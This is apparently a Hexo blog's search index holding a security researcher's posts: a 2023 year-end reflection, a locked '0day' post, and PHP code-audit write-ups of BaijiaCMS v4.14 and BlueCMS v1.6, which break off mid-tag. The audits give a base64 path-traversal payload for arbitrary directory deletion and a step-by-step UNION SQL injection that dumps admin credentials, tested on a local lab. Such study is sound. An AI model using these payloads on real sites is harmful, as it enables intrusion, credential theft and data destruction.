<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2023年度总结</title>
      <link href="/2023/12/28/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
      <url>/2023/12/28/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="0x1、前言"><a href="#0x1、前言" class="headerlink" title="0x1、前言"></a>0x1、前言</h2><p>一年又过去了，感觉今年又是没有成长的一年，由于工作内容的调整，在这也不分享总结和展示成果了，随缘总结吧。</p><h2 id="0x2、回顾"><a href="#0x2、回顾" class="headerlink" title="0x2、回顾"></a>0x2、回顾</h2><ul><li>工作思考</li></ul><p>今年的工作提升最大的代码能力，根据需求快速编写代码能力越来越强了，今年的产出感觉十分杂乱，什么工具脚本都有，有时候自己找都找半天，得找时间整理归档一下。在自主学习上感觉囫囵吞枣了，并未深入理解学习，前半年学习的免杀，在后半年工作变更后就没继续深入了。后半年想着学习Java，感觉计划很美好，现实很残酷。什么都想学就等于什么都没学会。明年得重新规划学习计划了，不能再这样漫无目的的学习。</p><ul><li>代码审计</li></ul><p>由于项目也接触了下PHP代码审计，感觉还行，简单的审审工作上遇到源码，也能审出点洞来，审出来直接通杀这个框架，感觉确实挺爽的。更让我觉得代码审计在工作中用处还是很大的，明年准备好好攻略代码审计了。</p><ul><li>生活</li></ul><p>今年把重心偏向于生活了，更加注重享受生活了，也开始了养生，每天早睡早起，注意饮食，晨跑锻炼，年底也有幸提了辆车，周末休息就使劲往外面跑，去外面露营、自驾、跟朋友一起兜风，让我感觉到了这才是生活的样子。</p><h2 id="0x3-思考"><a href="#0x3-思考" class="headerlink" title="0x3 思考"></a>0x3 思考</h2><p>快年末的时候，思考了许久，还是没有找到自己的一个方向，感觉什么都会点，但是什么都不精。东一点西一点，都在基础上，并未特别深入。明年的计划是专心并且系统的学习下代码审计了（在不卷要不跟不上了）。也感谢战队的好厚米今年分享的各种技术、经验，让我今年中还能学习到许多技术。</p><h2 id="0x4-总结"><a href="#0x4-总结" class="headerlink" title="0x4 总结"></a>0x4 总结</h2><p>今年因为工作的调整，让我感到了这才是生活的意义，也更加让我注重享受和体验生活，而不是一个只会上班的核动力 “驴” ，希望明年能继续保持锻炼和早睡早起吧。祝大家，生活愉快～</p>]]></content>
      
      
      
        <tags>
            
            <tag> 年度总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某招嫖网站0day</title>
      <link href="/2023/08/07/%E6%9F%90%E6%8B%9B%E5%AB%96%E7%BD%91%E7%AB%990day/"/>
      <url>/2023/08/07/%E6%9F%90%E6%8B%9B%E5%AB%96%E7%BD%91%E7%AB%990day/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不知道密码你看啥." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c55840b51bb2b40235792f00ce07dee66fea187b003376188cf13aa77c47eaf5"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 0Day </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计：百家CMSv4.14</title>
      <link href="/2023/07/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E7%99%BE%E5%AE%B6CMSv4-14/"/>
      <url>/2023/07/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E7%99%BE%E5%AE%B6CMSv4-14/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本章使用百家CMS v4.14作为代码审计</p><p>环境为 Win7 + PHPstudy</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>1.把下好的<code>百家CMS</code>源码文件<code>baijia</code>放到<code>phpStudy</code>的<code>WWW</code>目录下</p><p>2.访问地址：<code>http://localhost/baijia/index.php</code> 就会进入到安装界面,按照提示配置好参数，注意数据库用户名和密码要与你的mysql匹配</p><p>3.再访问：<code>http://localhost/baijia/index.php</code>，可以看到已经安装好了</p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>我们使用Seay源代码审计系统自动审计下</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307271039865.png" alt="image-20230727103929770"></p><h4 id="1、后台任意路径删除"><a href="#1、后台任意路径删除" class="headerlink" title="1、后台任意路径删除"></a>1、后台任意路径删除</h4><p>漏洞点：<code>/includes/baijiacms/common.inc.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rmdirs</span>(<span class="params"><span class="variable">$path</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$isdir</span>=<span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_dir</span>(<span class="variable">$path</span>))</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="variable">$file_list</span>= <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$file_list</span> <span class="keyword">as</span> <span class="variable">$file</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>( <span class="variable">$file</span>!=<span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$file</span>!=<span class="string">&#x27;..&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">               <span class="keyword">if</span>(<span class="variable">$file</span>!=<span class="string">&#x27;qrcode&#x27;</span>)</span><br><span class="line">               &#123;</span><br><span class="line">                    <span class="title function_ invoke__">rmdirs</span>(<span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file</span>,<span class="literal">true</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$path</span>!=WEB_ROOT.<span class="string">&#x27;/cache/&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">            @<span class="title function_ invoke__">rmdir</span>(<span class="variable">$path</span>);   </span><br><span class="line">               </span><br><span class="line">      &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$path</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断 <code>$Path</code> 是否为目录，不是目录直接 <code>unlink</code> 删除，如果是目录的话遍历文件和子目录将结果存入 <code>$file_list</code>  列表中，<code>foreach</code>  循环遍历目录中的文件和子目录，在循环中排除当前目录和上级目录，判断子目录名称如果不是 <code>qrcode</code> 就继续递归 <code>rmdirs</code> ，在处理完目录下文件和子目录，尝试删除自身，条件是自身不为 <code>cache</code></p><p>这里我们搜索全局调用 <code>rmdirs</code> 函数，在 <code>/system/manage/class/web/database.php</code> 处调用了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$operation</span>==<span class="string">&#x27;delete&#x27;</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="variable">$d</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GP</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"> <span class="variable">$path</span> = WEB_ROOT . <span class="string">&#x27;/config/data_backup/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_dir</span>(<span class="variable">$path</span> . <span class="variable">$d</span>)) &#123;</span><br><span class="line"><span class="title function_ invoke__">rmdirs</span>(<span class="variable">$path</span> . <span class="variable">$d</span>);</span><br><span class="line"><span class="title function_ invoke__">message</span>(<span class="string">&#x27;备份删除成功！&#x27;</span>, <span class="title function_ invoke__">create_url</span>(<span class="string">&#x27;site&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;act&#x27;</span> =&gt; <span class="string">&#x27;manager&#x27;</span>,<span class="string">&#x27;do&#x27;</span> =&gt; <span class="string">&#x27;database&#x27;</span>,<span class="string">&#x27;op&#x27;</span>=&gt;<span class="string">&#x27;restore&#x27;</span>)),<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>功能是删除备份文件</p><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>在后台删除备份文件时抓包</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307271509225.png" alt="image-20230727150927121"></p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307271511907.png" alt="image-20230727151148855"></p><p>修改id处为我们要删除的目录，base64加密下，这里我们创建一个test文件夹，将 <code>../../test</code> base64后填入id重放</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307271513911.png"></p><p>即可任意删除目录</p>]]></content>
      
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计：BlueCMSv1.6</title>
      <link href="/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/"/>
      <url>/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>萌新刚开始学习PHP代码审计，选了个简单的练手CMS</p><p>本章使用BlueCMS v1.6作为代码审计</p><p>环境为 Win7 + PHPstudy</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>1.把下好的<code>BlueCMS</code>源码文件<code>bluecms_src</code>放到<code>phpStudy</code>的<code>WWW</code>目录下</p><p>2.访问本地：<code>http://localhost/bluecms_src/</code>， 能看到项目文件</p><p>3.访问地址：<code>http://localhost/bluecms_src/uploads/install/</code> 就会进入到安装界面,按照提示配置好参数，注意数据库用户名和密码要与你的mysql匹配</p><p>4.再访问：<code>http://localhost/bluecms_src/uploads/</code>，可以看到已经安装好了</p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>我们使用Seay源代码审计系统自动审计下，我们可以发现有很多漏洞，我们追溯分析查看</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251454337.png" alt="image-20230725145359228"></p><h4 id="1、SQL注入：前台Union注入"><a href="#1、SQL注入：前台Union注入" class="headerlink" title="1、SQL注入：前台Union注入"></a>1、SQL注入：前台Union注入</h4><p>漏洞点： <code>ad_js.php</code></p><p>seay审计选中可能存在注入点，就能直接定位到位置</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251503538.png" alt="image-20230725150103076"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/include/common.inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$ad_id</span> = !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$ad</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">getone</span>(<span class="string">&quot;SELECT * FROM &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="string">&#x27;ad&#x27;</span>).<span class="string">&quot; WHERE ad_id =&quot;</span>.<span class="variable">$ad_id</span>);</span><br></pre></td></tr></table></figure><p>文件引用了<code>/include/common.inc.php</code> ，跳转过去看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$_POST</span> = <span class="title function_ invoke__">deep_addslashes</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$_GET</span> = <span class="title function_ invoke__">deep_addslashes</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="variable">$_COOKIES</span> = <span class="title function_ invoke__">deep_addslashes</span>(<span class="variable">$_COOKIES</span>);</span><br><span class="line"><span class="variable">$_REQUEST</span> = <span class="title function_ invoke__">deep_addslashes</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码是如果说php在没有开启<code>get_magic_quotes_gpc</code>的情况下，就将POST，GET，COOKIE，REQUEST传递的参数全部用<code>deep_addslashes</code>函数处理一遍。</p><p>追踪下<code>deep_addslashes()</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deep_addslashes</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$str</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$str</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$str</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">deep_addslashes</span>(<span class="variable">$val</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>deep_addslashes</code>对传入的数组进行递归地添加转义斜杠，如果不为数组则调用本身的<code>addslashes</code>进行过滤</p><p>回到注入点继续分析， <code>$ad_id</code> 没有使用单引号双引号包括，所以<code>addslashes()</code>函数不起作用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ad_id</span> = !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$ad</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">getone</span>(<span class="string">&quot;SELECT * FROM &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="string">&#x27;ad&#x27;</span>).<span class="string">&quot; WHERE ad_id =&quot;</span>.<span class="variable">$ad_id</span>);</span><br></pre></td></tr></table></figure><p><code>getone()</code> 是自定义函数，<code>getone()</code> 方法位于 <code>/include/mysql.class.php</code> 第61行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getone</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$type</span>=MYSQL_ASSOC</span>)</span>&#123;</span><br><span class="line">   <span class="variable">$query</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>,<span class="variable">$this</span>-&gt;linkid);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$query</span>, <span class="variable">$type</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$row</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码作用是执行SQL语句并返回第一条结果</p><p>传入的参数<code>$ad_id</code> 先判断是否为空，不为空使用<code>trim</code> 去除首位空格，没有过滤直接带入数据库执行，所以存在<code>SQL</code>注入，在 <code>ad_js.php</code> 最后一行将结果输出到了html代码注释中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!--\r\ndocument.write(\&quot;&quot;</span>.<span class="variable">$ad_content</span>.<span class="string">&quot;\&quot;);\r\n--&gt;\r\n&quot;</span>;</span><br></pre></td></tr></table></figure><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#判断注入点</span><br><span class="line">ad_js.php?ad_id=1 and 1=1#正常</span><br><span class="line">ad_js.php?ad_id=1 and 1=j#报错</span><br><span class="line"></span><br><span class="line">#判断字段长度</span><br><span class="line">ad_js.php?ad_id=1 order by 7#正常</span><br><span class="line">ad_js.php?ad_id=1 order by 8#报错</span><br><span class="line">···</span><br><span class="line">字段数为7</span><br><span class="line">···</span><br><span class="line"></span><br><span class="line">#判断回显位</span><br><span class="line">ad_js.php?ad_id=1 union select 1,2,3,4,5,6,7</span><br><span class="line">···</span><br><span class="line">页面回显空白，查看源代码可以发现回显了个7，所以回显位为第七位</span><br><span class="line">&lt;!--</span><br><span class="line">document.write(&quot;7&quot;);</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">#获取库名</span><br><span class="line">ad_js.php?ad_id=1 union select 1,2,3,4,5,6,database()</span><br><span class="line">···</span><br><span class="line">bluecms</span><br><span class="line">···</span><br><span class="line"></span><br><span class="line">#获取表名</span><br><span class="line">ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line">···</span><br><span class="line">&lt;!--</span><br><span class="line">document.write(&quot;blue_ad,blue_ad_phone,blue_admin,blue_admin_log,blue_ann,blue_ann_cat,blue_arc_cat,blue_area,blue_article,blue_attachment,blue_buy_record,blue_card_order,blue_card_type,blue_category,blue_comment,blue_config,blue_flash_image,blue_guest_book,blue_ipbanned,blue_link,blue_model,blue_navigate,blue_pay,blue_post,blue_post_att,blue_post_pic,blue_service,blue_task,blue_user&quot;);</span><br><span class="line">--&gt;</span><br><span class="line">···</span><br><span class="line"></span><br><span class="line">#获取blue_admin字段名</span><br><span class="line">ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_name=0x626c75655f61646d696e</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">这里需要将blue_admin转为十六进制格式，不然会被转义</span><br><span class="line">&lt;!--</span><br><span class="line">document.write(&quot;admin_id,admin_name,email,pwd,purview,add_time,last_login_time,last_login_ip&quot;);</span><br><span class="line">--&gt;</span><br><span class="line">···</span><br><span class="line"></span><br><span class="line">#查看admin_name和pwd字段信息</span><br><span class="line">ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(admin_name,0x3a,pwd) from blue_admin</span><br><span class="line">···</span><br><span class="line">&lt;!--</span><br><span class="line">document.write(&quot;admin:202cb962ac59075b964b07152d234b70&quot;);</span><br><span class="line">--&gt;</span><br><span class="line">···</span><br><span class="line">得到字段信息</span><br><span class="line">···</span><br></pre></td></tr></table></figure><h4 id="2、SQL注入：后台登录万能密码"><a href="#2、SQL注入：后台登录万能密码" class="headerlink" title="2、SQL注入：后台登录万能密码"></a>2、SQL注入：后台登录万能密码</h4><p>漏洞点：<code>/admin/login.php</code></p><p>该CMS数据库使用gb2312编码，这有可能导致宽字节注入</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307260959199.png" alt="image-20230726095954142"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$act</span> == <span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_id&#x27;</span>])&#123;</span><br><span class="line"><span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;您已登录，不用再次登录&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">template_assign</span>(<span class="string">&#x27;current_act&#x27;</span>, <span class="string">&#x27;登录&#x27;</span>);</span><br><span class="line"><span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;login.htm&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$act</span> == <span class="string">&#x27;do_login&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$admin_name</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;admin_name&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;admin_name&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$admin_pwd</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;admin_pwd&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;admin_pwd&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$remember</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>) ? <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;rememberme&#x27;</span>]) : <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$admin_name</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;用户名不能为空&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$admin_pwd</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;用户密码不能为空&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check_admin</span>(<span class="variable">$admin_name</span>, <span class="variable">$admin_pwd</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">update_admin_info</span>(<span class="variable">$admin_name</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$remember</span> == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;Blue[admin_id]&#x27;</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_id&#x27;</span>], <span class="title function_ invoke__">time</span>()+<span class="number">86400</span>);</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;Blue[admin_name]&#x27;</span>, <span class="variable">$admin_name</span>, <span class="title function_ invoke__">time</span>()+<span class="number">86400</span>);</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;Blue[admin_pwd]&#x27;</span>, <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$admin_pwd</span>).<span class="variable">$_CFG</span>[<span class="string">&#x27;cookie_hash&#x27;</span>]), <span class="title function_ invoke__">time</span>()+<span class="number">86400</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;您输入的用户名和密码有误&#x27;</span>);</span><br></pre></td></tr></table></figure><p> <code>$admin_name</code>和<code>$admin_pwd</code>参数使用isset判断是否存在，如果存在则使用trim去除首末两端空格，不存在则返回空字符串，跟踪<code>check_admin</code> 函数做进一步判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_admin</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$pwd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">getone</span>(<span class="string">&quot;SELECT COUNT(*) AS num FROM &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="string">&#x27;admin&#x27;</span>).<span class="string">&quot; WHERE admin_name=&#x27;<span class="subst">$name</span>&#x27; and pwd = md5(&#x27;<span class="subst">$pwd</span>&#x27;)&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;num&#x27;</span>] &gt; <span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断num如果大于0则返回true</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251713722.png" alt="image-20230725171305688"></p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251713596.png" alt="image-20230725171341565"></p><p>这里可以在admin处构造万能密码绕过校验</p><p><img 